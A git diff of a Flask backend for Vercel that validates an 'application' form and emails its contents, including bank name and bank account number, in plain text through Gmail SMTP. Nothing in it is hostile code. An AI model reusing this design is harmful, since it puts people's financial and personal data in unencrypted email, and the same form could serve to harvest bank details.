@@ -7,81 +7,114 @@ import smtplib
 import re
 import os
 
+# --- Flask App Definition for Vercel ---
+# Vercel's build process understands this simple setup.
+# It will automatically handle serving the static files from the root.
 app = Flask(__name__)
 CORS(app)
 
-# --- Email config (from environment variables in Vercel dashboard) ---
+# --- Securely load credentials from Vercel's Environment Variables ---
 SENDER_EMAIL = os.environ.get('SENDER_EMAIL')
 SENDER_PASSWORD = os.environ.get('SENDER_PASSWORD')
 RECEIVER_EMAIL = os.environ.get('RECEIVER_EMAIL')
 
-# --- All your validation functions remain the same ---
-def validate_email(email): # ...
+# --- Validation Functions (No changes needed) ---
+def validate_email(email):
     pattern = r'^[^\s@]+@[^\s@]+\.[^\s@]+$'
     return re.match(pattern, email) is not None
-# ... (keep all your other validation functions here)
 
-# --- Email sending route with ADDED LOGGING ---
+def validate_phone(phone):
+    pattern = r'^[0-9+\-\s]{7,15}$'
+    return re.match(pattern, phone) is not None
+
+def validate_age(age):
+    try:
+        return int(age) >= 18
+    except (ValueError, TypeError):
+        return False
+# ... (add any of your other specific validation functions if you have them)
+
+def validate_form_data(data):
+    errors = []
+    required_fields = ['first-name', 'last-name', 'email', 'phone', 'address', 'city-state', 'zipcode', 'gender', 'age', 'bank-name', 'bank-number']
+    for field in required_fields:
+        if not data.get(field) or not str(data.get(field)).strip():
+            errors.append(f"{field.replace('-', ' ').title()} is required.")
+    if errors: return errors
+    if not validate_email(data.get('email')): errors.append("Invalid email format.")
+    if not validate_phone(data.get('phone')): errors.append("Invalid phone number format.")
+    if not validate_age(data.get('age')): errors.append("You must be at least 18.")
+    return errors
+
+# --- API Endpoint for Form Submission ---
+# This is the only route the Flask app needs to handle.
+# Vercel handles serving index.html and other static files directly.
 @app.route('/sendmail', methods=['POST'])
 def send_mail_route():
     try:
-        data = request.get_json(force=True)
+        data = request.get_json()
     except Exception:
         return jsonify({"status": "error", "message": "Invalid JSON format"}), 400
 
-    # --- ADDED LOGGING: Check if variables were loaded ---
-    print("--- Verifying Environment Variables ---")
-    if SENDER_EMAIL:
-        print(f"SENDER_EMAIL loaded: {SENDER_EMAIL}")
-    else:
-        print("SENDER_EMAIL is MISSING!")
-    
-    if SENDER_PASSWORD:
-        print("SENDER_PASSWORD loaded: YES") # Don't print the actual password
-    else:
-        print("SENDER_PASSWORD is MISSING!")
+    validation_errors = validate_form_data(data)
+    if validation_errors:
+        return jsonify({"status": "error", "message": " | ".join(validation_errors)}), 400
 
-    if RECEIVER_EMAIL:
-        print(f"RECEIVER_EMAIL loaded: {RECEIVER_EMAIL}")
-    else:
-        print("RECEIVER_EMAIL is MISSING!")
-    print("------------------------------------")
-
-    # Your validation logic remains the same
-    # ...
-
+    # Check if the server-side environment variables are configured
     if not all([SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL]):
-        return jsonify({"status": "error", "message": "Server email settings are missing."}), 500
+        print("SERVER ERROR: Email environment variables are not set on Vercel.")
+        return jsonify({"status": "error", "message": "Server is not configured to send emails."}), 500
 
     try:
-        subject = "New Form Submission from Website"
-        body = f"You received a new application form submission:\n\nFirst Name: {data.get('first-name', 'N/A')}" # Shortened for brevity
-        
+        subject = "New Application from Your Website"
+        body = f"""
+You have received a new application with the following details:
+
+--- Personal Information ---
+First Name: {data.get('first-name', 'N/A')}
+Last Name: {data.get('last-name', 'N/A')}
+Email: {data.get('email', 'N/A')}
+Phone Number: {data.get('phone', 'N/A')}
+Gender: {data.get('gender', 'N/A')}
+Age: {data.get('age', 'N/A')}
+Occupation: {data.get('occupation', 'N/A')}
+
+--- Address ---
+Address: {data.get('address', 'N/A')}
+City & State: {data.get('city-state', 'N/A')}
+Zipcode: {data.get('zipcode', 'N/A')}
+
+--- Banking ---
+Bank Name: {data.get('bank-name', 'N/A')}
+Account Number: {data.get('bank-number', 'N/A')}
+"""
         msg = MIMEMultipart()
         msg['From'] = SENDER_EMAIL
         msg['To'] = RECEIVER_EMAIL
         msg['Subject'] = subject
         msg.attach(MIMEText(body, 'plain'))
 
-        print("Attempting to connect to smtp.gmail.com...")
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
-            print("Connection successful. Attempting to log in...")
             server.login(SENDER_EMAIL, SENDER_PASSWORD)
-            print("Login successful. Sending message...")
             server.send_message(msg)
-            print("Message sent successfully!")
 
-        return jsonify({"status": "success", "message": "Form sent successfully!", "redirect": "/thank_you.html"}), 200
+        return jsonify({
+            "status": "success",
+            "message": "Form sent successfully!",
+            "redirect": "/thank_you.html"
+        }), 200
 
     except Exception as e:
-        # --- CRITICAL: This will now show us the real error ---
-        print("---!!! EMAIL SENDING FAILED !!!---")
+        # This will log the actual error to your Vercel logs for debugging
+        print(f"---!!! PRODUCTION EMAIL SENDING FAILED !!!---")
         print(f"ERROR TYPE: {type(e).__name__}")
         print(f"ERROR MESSAGE: {e}")
         print("-----------------------------------")
         
-        # Return a detailed error message to the frontend for debugging
         return jsonify({
             "status": "error",
-            "message": f"Server Error: {e}"
+            "message": "An internal error occurred while sending the email."
         }), 500
+
+# NOTE: The if __name__ == '__main__': block and the dotenv imports are removed.
+# They are not needed for the Vercel production environment.
